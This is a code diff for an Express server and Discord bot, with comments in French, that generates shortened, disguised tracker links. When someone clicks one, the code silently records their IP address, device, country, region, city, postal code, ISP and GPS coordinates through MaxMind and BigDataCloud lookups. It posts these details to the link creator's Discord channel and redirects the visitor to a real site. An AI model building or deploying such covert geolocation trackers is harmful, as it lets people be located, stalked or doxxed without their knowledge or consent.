@@ -26,6 +26,7 @@ const port = process.env.PORT || 3000;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const TRACKER_BASE_URL = process.env.TRACKER_BASE_URL;
 const CUTTLY_API_KEY = process.env.CUTTLY_API_KEY;
+const BDC_TOKEN = process.env.BDC_TOKEN;
 const CLIENTS_FILE = './clients.json';
 const deviceDetector = new DeviceDetector();
 
@@ -35,7 +36,7 @@ const maxmind = require('maxmind');
   lookup = await maxmind.open('./GeoLite2-City.mmdb');
 })();
 
-// Fonction de raccourcissement via Cutt.ly
+// Fonction pour raccourcir via Cutt.ly
 async function shortenWithCuttly(longUrl, suffix) {
   try {
     const response = await axios.get('https://cutt.ly/api/api.php', {
@@ -69,11 +70,38 @@ app.get('/:type', async (req, res) => {
   const ip = rawIp.split(',')[0].trim();
   const userAgent = req.headers['user-agent'];
   const device = deviceDetector.parse(userAgent);
-  const geo = lookup.get(ip) || {};
+
+  let geo = {};
+  let bigdata = {};
+
+  try {
+    geo = lookup.get(ip) || {};
+  } catch {}
+
+  try {
+    const { data } = await axios.get(`https://api.bigdatacloud.net/data/ip-geolocation?ip=${ip}&localityLanguage=fr&key=${BDC_TOKEN}`);
+    bigdata = data;
+  } catch {}
+
+  const coordsMaxMind = geo?.location ? `${geo.location.latitude},${geo.location.longitude}` : null;
+  const coordsBigData = bigdata?.location ? `${bigdata.location.latitude},${bigdata.location.longitude}` : null;
+  const bestCoords = coordsBigData || coordsMaxMind;
+  const coordsField = bestCoords
+    ? `[${bestCoords}](https://maps.google.com/?q=${bestCoords})`
+    : '❌ Introuvable';
 
   const embed = new EmbedBuilder()
     .setTitle('📥 Nouvelle connexion détectée')
-    .setDescription(`**IP :** \`${ip}\`\n**Appareil :** ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}`)
+    .addFields(
+      { name: 'IP', value: `\`${ip}\`` },
+      { name: 'Appareil', value: `${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}` },
+      { name: 'Pays', value: geo?.country?.names?.fr || '❌ Introuvable', inline: true },
+      { name: 'Région', value: geo?.subdivisions?.[0]?.names?.fr || '❌ Introuvable', inline: true },
+      { name: 'Ville', value: geo?.city?.names?.fr || '❌ Introuvable', inline: true },
+      { name: 'Code Postal', value: geo?.postal?.code || '❌ Introuvable', inline: true },
+      { name: 'FAI', value: geo?.traits?.isp || '❌ Introuvable', inline: true },
+      { name: 'Localisation GPS', value: coordsField }
+    )
     .setColor(0x00AE86)
     .setTimestamp();
 
@@ -97,8 +125,7 @@ app.get('/:type', async (req, res) => {
   }
 
   if (['instagram', 'youtube', 'tiktok', 'facebook', 'x', 'discord'].includes(type)) {
-    let url = `https://${type}.com`;
-    if (type === 'x') url = `https://x.com`;
+    let url = `https://${type === 'x' ? 'x' : type}.com`;
     return res.redirect(url);
   }
 
@@ -119,7 +146,6 @@ client.once(Events.ClientReady, () => {
 });
 
 client.on(Events.InteractionCreate, async interaction => {
-  // Gestion du bouton "generate_tracker"
   if (interaction.isButton() && interaction.customId === 'generate_tracker') {
     if (interaction.replied || interaction.deferred) return;
     await interaction.reply({ content: "🔄 Création de ton salon privé...", ephemeral: true });
@@ -176,7 +202,6 @@ client.on(Events.InteractionCreate, async interaction => {
     fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));
   }
 
-  // Gestion du menu déroulant
   if (interaction.isStringSelectMenu() && interaction.customId === 'select_tracker_type') {
     if (interaction.replied || interaction.deferred) return;
     await interaction.reply({ content: "🔗 Génération de ton lien...", ephemeral: true });
@@ -186,13 +211,16 @@ client.on(Events.InteractionCreate, async interaction => {
     const selection = interaction.values[0];
     const shortId = crypto.randomBytes(3).toString("hex");
     const uniqueId = `${user.id}_${shortId}`;
-
     const baseUrl = process.env.TRACKER_BASE_URL.replace(/\/$/, '');
-    const generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;
 
-    // Nettoyage du suffixe pour Cutt.ly (ex : image.jpg => image-jpg)
+    let generatedUrl;
+    if (['instagram', 'youtube', 'tiktok', 'facebook', 'x', 'discord'].includes(selection)) {
+      generatedUrl = `https://${selection === 'x' ? 'x' : selection}.com`;
+    } else {
+      generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;
+    }
+
     const suffix = selection.replace(/\./g, '-');
-
     const shortLink = await shortenWithCuttly(generatedUrl, suffix) || generatedUrl;
 
     await channel.send(`✅ Ton lien est prêt :\n${shortLink}`);
